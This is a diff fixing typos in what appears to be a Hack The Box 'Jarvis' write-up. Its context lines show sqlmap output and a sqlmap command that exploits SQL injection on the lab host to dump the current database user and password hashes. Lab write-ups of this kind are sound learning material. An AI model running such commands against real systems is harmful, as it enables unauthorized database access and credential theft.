@@ -180,7 +180,7 @@ back-end DBMS: MySQL >= 5.0.12
 [...]
 ```
 
-Now we can use **sqlmap** to exploit the inyetion and dump information such as the curren database user and even the password hash.
+Now we can use **sqlmap** to exploit the inyection and dump information such as the current database user and even the password hash.
 
 ```
 $ sqlmap -u 'http://jarvis.htb/room.php?cod=1' --random-agent --level=1 --tamper=charencode --current-user --password
